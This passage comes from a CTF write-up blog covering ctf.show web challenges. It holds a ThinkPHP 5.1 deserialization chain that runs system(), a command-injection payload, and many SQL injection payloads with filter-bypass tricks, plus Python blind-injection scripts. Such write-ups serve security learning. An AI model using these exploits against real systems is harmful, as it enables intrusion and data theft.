class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在phpinfo页面找到flag</p><h4 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h4><p>进去就是Thinkphp v5.1，看样子就是thinkphp反序列化了，右键查看源码，找到入口，get传参code，但还是偷懒，找了下yu师傅发的链子（?lin=cat /f*&amp;data=）</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace think;abstract class Model&#123;    protected $append &#x3D; [];    private $data &#x3D; [];    function __construct()&#123;        $this-&gt;append &#x3D; [&quot;lin&quot;&#x3D;&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];        $this-&gt;data &#x3D; [&quot;lin&quot;&#x3D;&gt;new Request()];    &#125;&#125;class Request&#123;    protected $hook &#x3D; [];    protected $filter &#x3D; &quot;system&quot;;    protected $config &#x3D; [        &#x2F;&#x2F; 表单ajax伪装变量        &#39;var_ajax&#39;         &#x3D;&gt; &#39;_ajax&#39;,      ];    function __construct()&#123;        $this-&gt;filter &#x3D; &quot;system&quot;;        $this-&gt;config &#x3D; [&quot;var_ajax&quot;&#x3D;&gt;&#39;lin&#39;];        $this-&gt;hook &#x3D; [&quot;visible&quot;&#x3D;&gt;[$this,&quot;isAjax&quot;]];    &#125;&#125;namespace think\process\pipes;use think\model\concern\Conversion;use think\model\Pivot;class Windows&#123;    private $files &#x3D; [];    public function __construct()    &#123;        $this-&gt;files&#x3D;[new Pivot()];    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo base64_encode(serialize(new Windows()));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h4><p>发现魔法函数__destruct用system函数，那么只需让$this-&gt;evilfile为tru,$content又可以用post传参进行控制，payload：</p><pre class="line-numbers language-none"><code class="language-none">?fn&#x3D;;cat f*post:jian&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="web276-278"><a href="#web276-278" class="headerlink" title="web276-278"></a>web276-278</h4><p>先跳过了，等以后再找时间做吧</p>]]></content>
      
      
      <categories>
          
          <category> ctf_show </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web入门_反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_SHOW之web入门sql部分wp</title>
      <link href="/2022/03/23/jian-web-sql/"/>
      <url>/2022/03/23/jian-web-sql/</url>
      
        <content type="html"><![CDATA[<h3 id="无过滤注入"><a href="#无过滤注入" class="headerlink" title="无过滤注入"></a>无过滤注入</h3><h4 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//拼接sql语句查找指定ID用户</span>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from user where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>直接采用拼接闭合payload:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' or username='</span>flag'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h4><p>首先测试有几列</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' order by 2--+；1'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现2不报错，3报错，说明有两列<br>然后查询数据库名：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_172a.png"></p><p>拿到数据库名后再继续查询表名：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select group_concat(table_name),2 from information_schema.tables where table_schema='</span>ctfshow_web'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_172b.png"></p><p>发现有两个表，然后分别查询表的列名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select group_concat(column_name),2 from information_schema.columns where table_name='</span>ctfshow_user2'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_172c.png"></p><p>然后再查询password字段里的内容</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> password<span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">from</span> ctfshow_user2<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h4><p>继续上题的思路，变成了3列</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查数据库名：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_173a.png"></p><p>查表名</p><p>1’ union select group_concat(table_name),2,3 from information_schema.tables where table_schema=’ctfshow_web’–+</p><p><img src="/images/web_173b.png"></p><p>查字段名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select group_concat(column_name),2,3 from information_schema.columns where table_name='</span>ctfshow_user3'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_173c.png"></p><p>查询password字段里的内容：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> password<span class="token punctuation">,</span><span class="token number">2</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> ctfshow_user3<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h4><p>先测试出有几个字段，发现在2的时候的回显正常，3的时候异常，说明有两个字段</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现两个字段都能回显</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select '</span>a<span class="token string">','</span>b' <span class="token keyword">from</span> ctfshow_user4<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_174a.png"></p><p>然后因为返回的数据中不能有flag和数字，所以需要将其中的数字替换掉</p><p>replace(input_string, substring, new_substring)</p><ul><li><code>input_string</code>是要搜索的任何字符串表达式。</li><li><code>substring</code>是要替换的子字符串。</li><li><code>new_substring</code>是替换字符串。</li></ul><p><code>REPLACE()</code>函数返回一个新字符串，其中出现所有子字符串被<code>new_substring</code>替换。 如果任何参数为<code>NULL</code>，则返回<code>NULL</code>。</p><p>所以我们只需要一层一层的替换即可、</p><p>先本地构造出替换数字的sql语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token number">1234567890</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'numA'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'numB'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'numC'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'numD'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'numE'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'numF'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'numG'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'numH'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'numI'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'numJ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后因为直接知道表名和字段名所以直接构造出payload：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select '</span>a<span class="token string">',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,'</span>numA<span class="token string">'),2,'</span>numB<span class="token string">'),3,'</span>numC<span class="token string">'),4,'</span>numD<span class="token string">'),5,'</span>numE<span class="token string">'),6,'</span>numF<span class="token string">'),7,'</span>numG<span class="token string">'),8,'</span>numH<span class="token string">'),9,'</span>numI<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>numJ'<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_user4<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到的flag的内容为;</p><pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;numDdbnumInumDnumAnumGnumG-numInumBnumEc-numDnumBnumCe-aanumJnumJ-numHnumGnumFdnumFfnumFnumFnumInumGanumE&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再写个py脚本替换回去：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsflag1 <span class="token operator">=</span> <span class="token string">"ctfshow&#123;numDdbnumInumDnumAnumGnumG-numInumBnumEc-numDnumBnumCe-aanumJnumJ-numHnumGnumFdnumFfnumFnumFnumInumGanumE&#125;"</span>flag <span class="token operator">=</span> <span class="token string">" "</span>flag <span class="token operator">=</span> flag1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numA'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numB'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numC'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numD'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numE'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numF'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numG'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numH'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numI'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numJ'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这一次将所有的字符数字都过滤了，所有考虑采用盲注的方法。<br>substr(str,pos,len): 从pos开始的位置，截取len个字符</p><p>python脚本为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://86e4b4c8-3a29-44f1-a519-e467033706e2.challenge.ctf.show/api/v5.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"1234567890qwertyuiopasdfghjklzxcvbnm-&#123;&#125;"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and if(substr((select password from ctfshow_user5 where username = \"flag\"),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)=\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">\",sleep(3),0)--+"</span></span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>        <span class="token comment">#print(res.status_code)</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> end<span class="token operator">-</span>start <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h3 id="过滤注入"><a href="#过滤注入" class="headerlink" title="过滤注入"></a>过滤注入</h3><h4 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h4><p>进入了过滤题了，先查看有几个字段</p><pre class="line-numbers language-none"><code class="language-none">1%27%20order%20by%203--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现在3时有数据，4没有数据，说明有3个字段</p><p><img src="/images/web_176a.png"></p><p><img src="/images/web_176b.png"></p><p>再继续输入payload：</p><pre class="line-numbers language-none"><code class="language-none">1%27%20union%20select%20id%20,username,password%20from%20ctfshow_user--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有数据返回，将select改为Select后，成功返回数据，说明对select也进行了过滤，但并没大小写进行过滤，所以直接绕过，拿到flag</p><h4 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h4><p>这次发现是对空格的过滤，所以可以用/**/进行绕过，payload</p><pre class="line-numbers language-none"><code class="language-none">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;&#39;a&#39;,&#39;b&#39;,password&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者直接用万能密码进行绕过</p><pre class="line-numbers language-none"><code class="language-none">1&#39;or(1&#x3D;1)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h4><p>本题在原先的基础上将/**/也过滤了，但我们可以采用%09（水平制表符）进行绕过，payload：</p><pre class="line-numbers language-none"><code class="language-none">1&#39;%09union%09select%09password,&#39;a&#39;,&#39;b&#39;%09from%09ctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><p>也可以继续用万能密码</p><pre class="line-numbers language-none"><code class="language-none">1&#39;%09or%091&#x3D;1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h4><p>本题在上一题的基础上又将%09过滤了，继续尝试其他的控制字符，发现%0c可以绕过，payload：</p><pre class="line-numbers language-none"><code class="language-none">1&#39;%0cunion%0cselect%0cpassword,&#39;a&#39;,&#39;b&#39;%0cfrom%0cctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h4><p>本题在上一题的基础上将%23也过滤了，看了下其他师傅们的博客，是进行拼接sql语句拿到flag的</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">-1&#39;or(username&#x3D;&#39;flag&#39;)and&#39;1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时完整的sql语句为:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,password from ctfshow_user where username !='flag' and id = '-1'or(username='flag')and'1=1' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为and的优先级高于or，所以会先进行后面的与运算(username=’flag’)and’1=1’，为真；再与-1进行或运算，得到的结果也为真，所以整个条件也就为真，拿到flag</p><h4 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h4><p>终于可以看见过滤的参数了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但我们依旧可以拿去180的payload进行绕过</p><pre class="line-numbers language-none"><code class="language-none">-1&#39;or(username&#x3D;&#39;flag&#39;)and&#39;1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h4><pre class="line-numbers language-none"><code class="language-none">function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag&#x2F;i&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>相比上一题，这题又多过滤了flag字符串，所以只需将上一题的payload修改以下即可（因为知道flag的id为26）：</p><pre class="line-numbers language-none"><code class="language-none">-1&#39;or(id&#x3D;26)and&#39;1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h4><pre class="line-numbers language-none"><code class="language-none">function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into&#x2F;i&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>先根据它给的查询语句，post：tableName=ctfshow_user，然后发现$user_count = 22，说明总共有22条数据</p><p>因为or和and等都被过滤了，于是想到了还有like，构造payload：</p><pre class="line-numbers language-none"><code class="language-none">postl：tableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow%25&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现此时$user_count = 1，于是可以通过判断$user_count 是否为1的方式来对进行盲注</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://cf291130-ee20-4e3f-b82b-38f96f53ba36.challenge.ctf.show/select-waf.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"(ctfshow_user)where(pass)like'&#123;0&#125;%'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#print(res.status_code)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h4><pre class="line-numbers language-none"><code class="language-none">function waf($str)&#123;    return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这题在上一题的基础上将where又过滤了，但还可用having</p><p>having 子句的作用是筛选满足条件的组，即在分组之后过滤数据，条件中经常包含聚组函数，使用having 条件显示特定的组，也可以使用多个分组标准进行分组。 与 where 和select的交互方式类似。where搜索条件在进行分组操作之前应用；而having搜索条件在进行分组操作之后应用。</p><p>同时也需要将ctfshow%进行16进制编码：</p><pre class="line-numbers language-none"><code class="language-none">ctfshow：0x63746673686f7725post：tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f7725<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以再次发现$user_count = 1;只需在上一题的脚本上进行一些修改即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://1adbebff-1c42-4d35-aa92-3133b7badd18.challenge.ctf.show/select-waf.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        str1 <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> str2hex<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass like &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token comment">#print(res.text)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition 